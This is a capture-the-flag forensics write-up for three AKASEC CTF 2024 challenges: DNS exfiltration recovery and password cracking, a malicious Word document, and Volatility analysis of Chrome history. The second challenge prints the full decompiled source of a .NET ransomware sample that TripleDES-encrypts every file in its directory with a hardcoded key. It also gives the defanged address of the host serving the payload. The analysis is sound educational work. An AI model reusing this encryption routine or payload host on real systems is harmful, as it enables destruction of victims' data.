Hi everyone, this time me and World Wide Flags have joined AKASEC CTF, and fortunately, I solved all forensic challenges there and this is writeup for them. Let's go!

### Sussy
In this challenge, we will give a pcapng file, and we need to analyze it. First, open it in Wireshark: 

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/822c157b-124c-44fa-8e05-b3fc7e9030b2)

As you can see right now in DNS packets, their query names is very weird, and each packet has a different name. This is the sign for DNS exfiltration and this is my solution: 
- First, extract all DNS query names:
![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/4475d2ac-79e6-48bd-a7f4-375b20247f77)
- Second, filter these query names that contain "akasec.ma":
![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/45263a8c-db04-4765-898c-e3906a922ee6)
- Third, you can see that it has some duplicated strings, so you need to remove that string by using **uniq** command:
![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/8b030764-f25a-408b-98d8-f890b23122b8)
- Fourth, remove "akasec.ma" also "\n" to ensure that there're just hex strings. I removed "akasec.ma" by my hand and write a Python script to remove "\n":

```
with open("C:\\Users\\Admin\\Downloads\\result4.txt", 'r') as file:
    arr = file.read().split() 
print(''.join(arr))
```

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/25a82fc7-6acc-4d22-a2b9-8e97258b5d84)

Now you have everything, just decode it (you can use CyberChef or **xxd** command): 

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/ad33f611-e5d5-48c8-b68f-9e977a0cfd93)

You will see that there's a 7z file, I tried to open it but it needed password: 

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/67aae8d5-d83f-41e3-953e-05fa5bccebdd)

From here I used **7z2john** to extract hash of the file and use **john** to crack the hash. And after a short time, you will get **hellokitty** is the password for 7z file.: 

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/35710f3f-c5b6-4a00-af50-833de4eae463)

You will get a file named **flag**, and it's a PDF file (when you cat file, you will see PDF structure or you can check by using **file**):

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/e981499b-69c1-4bc3-b233-fe9bec668c2b)

Also it needs password, so you will do the same with 7z file by using pdf2john to extract hash, john to crack and you will get **meow** is the file password, open it and you will get the flag:

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/be42556e-407a-43c6-9b2b-5760f9d2609f)

### saveme

In this challenge they gave us a zip file contains a doc file and many images. First, I checked all images file and they're corrupted, and I think that doc file did something to these images.
Not waiting, I started analysing it by using **olevba** but there's nothing:

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/5f4ee1be-ea58-4bb9-bbbf-e46d76598682)

I tried to use binwalk to extract files inside and read content of doc file in **document.xml** file and I found that there's a weird string:

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/22719dac-2405-4a47-a966-3a492784d24a)

Open that file in Word you can see a long whitespace after image, and I fill that area by red color and I found that string:

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/fadeb2a4-2ee7-4d1d-a2d9-37355a06c2ad)

After a short time I guessed it's hex string that seperated by "&H", I decided to write a Python script to solve it: 

```
with open("C:\\Users\\Admin\\Documents\\Code\\Python\\payload", 'r') as file:
    payload = file.read().split("&H")
print(''.join(payload))
```

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/ebf5da73-8123-4457-99d8-597ee7bf49ac)

You can realise that **4D5A** is signature for executable file, and we will take that output and decode from hex and save it to a file: 

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/a17a11ac-789c-41ab-826c-651e0f015fc4)

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/72f4f1e3-beba-4a64-b96a-1163047600a7)


My next step is uploading that file to **any.run** for automatic analysis because that file has 32-bits infrastructure. In HTTP requests tab, you can see that powershell.exe downloaded ransomware from hxxp[://]20[.]81[.]130[.]178:8080/: 

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/9c6959b2-c9cc-4a65-ac13-97883c79ff34)

Because this URL's still live, so I tried to download that file to my machine:

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/894d68ed-3cf7-48fb-80fe-107832ee1eea)

Check that file I found that it's packed by .NET, so we can use dnSpy for reversing it: 

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/06150b07-7b70-4996-8484-24c38dffb057)

```
// b
// Token: 0x06000003 RID: 3 RVA: 0x000020FC File Offset: 0x000002FC
private static void a(string[] A_0)
{
	string text = "Lp3jXluuW799rnu4";
	byte[] array = new byte[]
	{
		0,
		1,
		2,
		3,
		4,
		5,
		6,
		7
	};
	<Module>.h = 2081625616;
	byte[] array2 = array;
	string currentDirectory = Directory.GetCurrentDirectory();
	<Module>.k = -1592258590;
	<Module>.a = null;
	int num = 1386028750;
	int l = -1437277352;
	<Module>.n = -1592516334;
	<Module>.l = l;
	<Module>.d = num;
	string[] files = Directory.GetFiles(currentDirectory, "*.*");
	<Module>.n = 2136656571;
	string[] array3 = files;
	<Module>.d = null;
	string[] array4 = array3;
	int num2 = 0;
	bool flag;
	<Module>.g = flag;
	string text2;
	for (;;)
	{
		<Module>.k = 1326660401;
		<Module>.e = 1818084011;
		int num3 = num2;
		string[] array5 = array4;
		<Module>.j = -1529522494;
		bool flag2 = num3 < array5.Length;
		<Module>.o = 1526447315;
		<Module>.j = 1987339265;
		flag = flag2;
		bool flag3 = flag;
		<Module>.a = null;
		if (!flag3)
		{
			break;
		}
		<Module>.j = 1845842485;
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider;
		<Module>.c = tripleDESCryptoServiceProvider;
		text2 = array4[num2];
		try
		{
			<Module>.q = -759738571;
			<Module>.b = null;
			<Module>.q = 1898371779;
			string path = text2;
			a.b = flag;
			byte[] array6 = File.ReadAllBytes(path);
			<Module>.g = null;
			a.b = "185ee01d-8c67-459c-9586-6804417e592ce434881f-7f35-4ffd-bdf6-4a1f244e25084e41b92d-afec-";
			<Module>.d = null;
			byte[] array7 = array6;
			<Module>.h = 1308380089;
			tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			SymmetricAlgorithm symmetricAlgorithm = tripleDESCryptoServiceProvider;
			Encoding ascii = Encoding.ASCII;
			string s = text;
			<Module>.k = 401140706;
			symmetricAlgorithm.Key = ascii.GetBytes(s);
			<Module>.o = 1203310366;
			SymmetricAlgorithm symmetricAlgorithm2 = tripleDESCryptoServiceProvider;
			byte[] iv = array2;
			c.b = text;
			symmetricAlgorithm2.IV = iv;
			byte[] array8 = b.b(array7, tripleDESCryptoServiceProvider);
			string path2 = text2;
			byte[] bytes = array8;
			<Module>.n = -1749758540;
			File.WriteAllBytes(path2, bytes);
			string str = "Encrypted: ";
			a.b = "102abfb4-ec8b-4922-9b54-2f17b2c5b52d6d";
			string str2 = text2;
			Exception ex;
			<Module>.a = ex;
			Console.WriteLine(str + str2);
			c.b = 1876936332;
		}
		catch (Exception ex2)
		{
			<Module>.m = -1040838703;
			Exception ex = ex2;
			string str3 = "Error: ";
			Exception ex3 = ex;
			a.b = tripleDESCryptoServiceProvider;
			string text3 = str3 + ex3.Message;
			<Module>.o = 1057425350;
			<Module>.d = null;
			Console.WriteLine(text3);
			a.b = "dd91927e-4e7c-4176-b90a-bb4a9049b638480c140d-829f-4";
			<Module>.e = 1957620381;
			<Module>.a = null;
			<Module>.m = -1748580011;
			int q = 2097519326;
			<Module>.m = -1932913121;
			<Module>.q = q;
		}
		<Module>.c = text2;
		<Module>.k = 480802764;
		object b = null;
		<Module>.a = flag;
		c.b = b;
		<Module>.h = num2;
		<Module>.g = text;
		int num4 = num2;
		int num5 = 1;
		<Module>.k = 2071185029;
		int num6 = num4 + num5;
		object g = null;
		c.a = tripleDESCryptoServiceProvider;
		<Module>.g = g;
		object b2 = 1952428595;
		<Module>.q = 1809257038;
		c.b = b2;
		num2 = num6;
	}
	Console.ReadLine();
	<Module>.j = num2;
	bool flag4 = flag;
	<Module>.o = 721847420;
	<Module>.l = 796469985;
	<Module>.q = -1051365525;
	<Module>.n = num2;
	<Module>.f = flag4;
	c.a = text2;
}
```

This is source code of that ransomware, let's analyse it. The most important thing I noticed was it used triple DES to encrypt data:

```
tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
SymmetricAlgorithm symmetricAlgorithm = tripleDESCryptoServiceProvider;
Encoding ascii = Encoding.ASCII;
string s = text;
<Module>.k = 401140706;
symmetricAlgorithm.Key = ascii.GetBytes(s);
<Module>.o = 1203310366;
SymmetricAlgorithm symmetricAlgorithm2 = tripleDESCryptoServiceProvider;
byte[] iv = array2;
```

DES3 still needs key and iv to decrypt, and you can see in this code, key is got from text which is **"Lp3jXluuW799rnu4"** and iv is a **byte array contains value from 0 to 7**. And what data we need to decrypt? It's corrupted image.
I tried with image 144... which is different from each other, used CyberChef for decryption and I got the flag: 

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/ea653a59-5e2b-4ff6-8aa6-6088e25c88d8)

### Portugal
We have memory file, and volatility will work in this case. Not waiting, I checked processes list of this machine. **google.exe** looked most suspicious: 

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/3189e806-a77e-4ef5-bccd-61367f53c9a8)

Follow the description, **I'm sure that someone took advantage of the opportunity and was searching for something.**, keyword "searching" made me think about google history. Not waiting, I tried to extract google history file inside the memory file.
You will look for History file in **C:\Users\USER_NAME\AppData\Local\Google\Chrome\User Data\Default\History**, extract it by **windows.filescan** plugin (do it by yourself): 

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/09ada68d-03de-43a3-bdf7-9b593cac6353)

The fastest way to read this file is use **strings** 😂😂😂 and you will find the flag that seperated by many parts: 

![image](https://github.com/odintheprotector/AKASEC-CTF-2024/assets/75618225/5fc68d1b-661e-40f4-b7c8-249a017224b0)

**Flag: AKASEC{V0L4T1L1TY_f0r_chr0m3_s34rc$h_h1st0ry}**
